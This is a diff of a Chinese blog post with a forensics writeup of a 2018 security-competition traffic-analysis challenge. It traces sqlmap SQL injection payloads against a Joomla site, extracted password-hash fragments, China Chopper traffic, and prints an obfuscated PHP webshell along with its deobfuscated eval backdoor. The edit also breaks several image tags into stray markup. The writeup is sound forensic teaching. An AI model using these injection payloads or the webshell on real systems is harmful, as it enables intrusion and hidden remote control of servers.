@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>2018.5.5信息安全铁人三项赛数据赛题解 · Sky&#39;s blog</title>
+    <title>2018.5.5 信息安全铁人三项赛数据赛题解 · sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -214,14 +214,14 @@
     
     <div class="banner">
             <div class="blog-title">
-                <a href="/" >Sky&#39;s blog</a>
+                <a href="/" >sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">2018.5.5信息安全铁人三项赛数据赛题解</a>
+                <a href="#" class="post-name">2018.5.5 信息安全铁人三项赛数据赛题解</a>
             </div>
     </div>
     
-    <a class="home-link" href=/>Sky's blog</a>
+    <a class="home-link" href=/>sky's blog</a>
 </header>
     <div class="wrapper">
         <div class="site-intro" style="
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            2018.5.5信息安全铁人三项赛数据赛题解
+            2018.5.5 信息安全铁人三项赛数据赛题解
             <!-- 404 -->
             
         </h1>
@@ -266,15 +266,15 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Flow-Analysis">Flow-Analysis</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">4,017</span>阅读时长: <span class="post-count reading-time">19 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">4,038</span>阅读时长: <span class="post-count reading-time">19 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -405,15 +405,15 @@ height:50vh;
     <article class="article-entry">
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于自己赛区的铁三比赛在最后一场，于是利用闲暇时间做了一下别的赛区的题目，这里给出5月5号比赛的数据赛做题记录<br>题目分享：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ 密码: nux4</span><br></pre></td></tr></table></figure></p>
 <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>1.黑客攻击的第一个受害主机的网卡IP地址<br>2.黑客对URL的哪一个参数实施了SQL注入<br>3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)<br>4.第一个受害主机网站数据库的名字<br>5.Joomla后台管理员的密码是多少<br>6.黑客第一次获得的php木马的密码是什么<br>7.黑客第二次上传php木马是什么时间<br>8.第二次上传的木马通过HTTP协议中的哪个头传递数据<br>9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br>10.php代理第一次被使用时最先连接了哪个IP地址<br>11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br>12.黑客在内网主机中添加的用户名和密码是多少<br>13.黑客从内网服务器中下载下来的文件名</p>
-<h2 id="第一个数据包"><a href="#第一个数据包" class="headerlink" title="第一个数据包"></a>第一个数据包</h2><p>面对巨大的流量包，过滤格外重要，这里我们先过滤为http协议<br><img src="/images/xipu5.5 (1).jpg"><br>可以看到202.1.1.2对192.168.1.8进行了疯狂的爆破<br>我们跟进一条数据，进行tcp流跟踪<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=1&amp;type_id=1&amp;list[select]=(*&apos;+(SELECT &apos;ZoHc&apos; WHERE 1078=1078 OR (SELECT 2511 FROM(SELECT COUNT(*),CONCAT(0x71626a6b71,(SELECT (ELT(2511=2511,1))),0x716a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))+&apos; HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Host: 202.1.1.1:8000</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: sqlmap/1.1.3.2#dev (http://sqlmap.org)</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure></p>
+<h2 id="第一个数据包"><a href="#第一个数据包" class="headerlink" title="第一个数据包"></a>第一个数据包</h2><p>面对巨大的流量包，过滤格外重要，这里我们先过滤为http协议<br><img src="/images/xipu5.5 (1" alt="">.jpg”&gt;<br>可以看到202.1.1.2对192.168.1.8进行了疯狂的爆破<br>我们跟进一条数据，进行tcp流跟踪<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=1&amp;type_id=1&amp;list[select]=(*&apos;+(SELECT &apos;ZoHc&apos; WHERE 1078=1078 OR (SELECT 2511 FROM(SELECT COUNT(*),CONCAT(0x71626a6b71,(SELECT (ELT(2511=2511,1))),0x716a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))+&apos; HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Host: 202.1.1.1:8000</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: sqlmap/1.1.3.2#dev (http://sqlmap.org)</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure></p>
 <p>不难看出，黑客利用sqlmap在对目标站点进行不断的sql注入试探<br>可以确定无误，受害主机的网卡IP地址即为192.168.1.8<br>而注入的参数也可以清晰的看见，为<code>list[select]</code><br>再根据回显内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;*&apos;+(SELECT &apos;ZoHc&apos; WHERE 1078=1078 OR (SELECT 2511 FROM(SELECT COUNT(*),CONCAT(0x&apos; at line 1 SQL=SELECT (*&apos;+(SELECT &apos;ZoHc&apos; WHERE 1078=1078 OR (SELECT 2511 FROM(SELECT COUNT(*),CONCAT(0x71626a6b71,(SELECT (ELT(2511=2511,1))),0x716a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))+&apos;,uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`</span><br></pre></td></tr></table></figure></p>
 <p>目标站点数据库抛出的错误，可以清晰的看见<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users</span><br></pre></td></tr></table></figure></p>
 <p>不难确定，目标站点的数据库表名前缀为<code>ajtuc_</code><br>接着为了确定受害主机网站数据库的名字，我又进行了一次过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http</span><br></pre></td></tr></table></figure></p>
 <p>此时挑选最后一次注入的payload进行解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=1&amp;type_id=1&amp;list[select]=(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),4235))</span><br></pre></td></tr></table></figure></p>
 <p>可以清楚的看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM joomla.ajtuc_users</span><br></pre></td></tr></table></figure></p>
 <p>可以马上确定，数据库名为joomla<br>为快速寻找后台管理员密码,我进行了如下筛选<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http contains &quot;password&quot; &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure></p>
-<p>但是并没有找到有效登录<br><img src="/images/xipu5.5 (2).jpg"><br><img src="/images/xipu5.5 (3).jpg"><br>随机我想在sql注入中寻找密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http contains &quot;password&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/xipu5.5 (4).jpg"><br>三条信息分别回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: &apos;qqzvq$2y$10$lXujU7XaUviJDigqqkkq&apos; SQL=SELECT (UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7096)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`</span><br><span class="line"></span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&apos; SQL=SELECT (UPDATEXML(3613,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),23,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7939)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`</span><br><span class="line"></span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqzi/8B2QRD7qIlDJeqqkkq&apos; SQL=SELECT (UPDATEXML(8949,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),45,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),3079)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`</span><br></pre></td></tr></table></figure></p>
+<p>但是并没有找到有效登录<br><img src="/images/xipu5.5 (2" alt="">.jpg”&gt;<br><img src="/images/xipu5.5 (3" alt="">.jpg”&gt;<br>随机我想在sql注入中寻找密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http contains &quot;password&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/xipu5.5 (4" alt="">.jpg”&gt;<br>三条信息分别回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: &apos;qqzvq$2y$10$lXujU7XaUviJDigqqkkq&apos; SQL=SELECT (UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7096)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`</span><br><span class="line"></span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&apos; SQL=SELECT (UPDATEXML(3613,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),23,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7939)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`</span><br><span class="line"></span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqzi/8B2QRD7qIlDJeqqkkq&apos; SQL=SELECT (UPDATEXML(8949,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),45,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),3079)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`</span><br></pre></td></tr></table></figure></p>
 <p>可以看到数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qqzvq$2y$10$lXujU7XaUviJDigqqkkq</span><br><span class="line">qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq</span><br><span class="line">qqzvqzi/8B2QRD7qIlDJeqqkkq</span><br></pre></td></tr></table></figure></p>
 <p>我们观察sql构造，发现具有前缀和后缀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x71717a7671</span><br><span class="line">0x71716b6b71</span><br></pre></td></tr></table></figure></p>
 <p>解码后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qqzvq</span><br><span class="line">qqkkq</span><br></pre></td></tr></table></figure></p>
@@ -421,9 +421,9 @@ height:50vh;
 <p>于是我们可以得到完整的加密密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe</span><br></pre></td></tr></table></figure></p>
 <p>但是一直没有解密成功……有大师傅知道解法可以告诉我，thanks</p>
 <h2 id="第二个数据包"><a href="#第二个数据包" class="headerlink" title="第二个数据包"></a>第二个数据包</h2><p>由于已确定目标ip，所以依旧使用以下过滤简化操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/xipu5.5 (5).jpg"><br>可以看到一个奇怪文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kkkaaa.php</span><br></pre></td></tr></table></figure></p>
-<p>我们跟进POST数据查看<br><img src="/images/xipu5.5 (6).jpg"><br>不难发现，是中国菜刀的流量<br>小马密码为zzz<br>接着为确定黑客第二次上传php木马的时间<br>我进行了过滤，因为我猜想，黑客应该是根据第一个小马来上传的第二个小马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure></p>
-<p>此时一条数据格外引人注目<br><img src="/images/xipu5.5 (7).jpg"><br>我们对其16进制进行分析<br><img src="/images/xipu5.5 (8).jpg"><br>将其保存为php文件<br>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;</span><br><span class="line">$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;</span><br><span class="line">$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;</span><br><span class="line">$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;</span><br><span class="line">$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;</span><br><span class="line">$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;</span><br><span class="line">$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;</span><br><span class="line">$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);</span><br><span class="line">$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;</span><br><span class="line">$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;</span><br><span class="line">$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;</span><br><span class="line">$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;</span><br><span class="line">$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;</span><br><span class="line">$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="line">$N=$j(<span class="string">''</span>,$x);$N();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/xipu5.5 (5" alt="">.jpg”&gt;<br>可以看到一个奇怪文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kkkaaa.php</span><br></pre></td></tr></table></figure></p>
+<p>我们跟进POST数据查看<br><img src="/images/xipu5.5 (6" alt="">.jpg”&gt;<br>不难发现，是中国菜刀的流量<br>小马密码为zzz<br>接着为确定黑客第二次上传php木马的时间<br>我进行了过滤，因为我猜想，黑客应该是根据第一个小马来上传的第二个小马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure></p>
+<p>此时一条数据格外引人注目<br><img src="/images/xipu5.5 (7" alt="">.jpg”&gt;<br>我们对其16进制进行分析<br><img src="/images/xipu5.5 (8" alt="">.jpg”&gt;<br>将其保存为php文件<br>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;</span><br><span class="line">$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;</span><br><span class="line">$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;</span><br><span class="line">$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;</span><br><span class="line">$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;</span><br><span class="line">$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;</span><br><span class="line">$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;</span><br><span class="line">$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);</span><br><span class="line">$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;</span><br><span class="line">$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;</span><br><span class="line">$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;</span><br><span class="line">$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;</span><br><span class="line">$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;</span><br><span class="line">$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="line">$N=$j(<span class="string">''</span>,$x);$N();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>于是我立刻进行了解混淆<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure></p>
 <p>得到结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">15</span>) <span class="string">"create_function"</span></span><br><span class="line">string(<span class="number">929</span>) <span class="string">"$kh="</span>cb42<span class="string">";$kf="</span>e130<span class="string">";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="</span><span class="string">";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r["</span>HTTP_REFERER<span class="string">"];$ra=@$r["</span>HTTP_ACCEPT_LANGUAGE<span class="string">"];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u["</span>query<span class="string">"],$q);$q=array_values($q);preg_match_all("</span>/([\w])[\w-]+(?:;q=<span class="number">0.</span>([\d]))?,?/<span class="string">",$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss="</span>substr<span class="string">";$sl="</span>strtolower<span class="string">";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="</span><span class="string">";for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]="</span><span class="string">";$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("</span>/_/<span class="string">","</span>/-/<span class="string">"),array("</span>/<span class="string">","</span>+<span class="string">"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("</span>&lt;$k&gt;$d&lt;/$k&gt;<span class="string">");@session_destroy();&#125;&#125;&#125;&#125;"</span></span><br></pre></td></tr></table></figure></p>
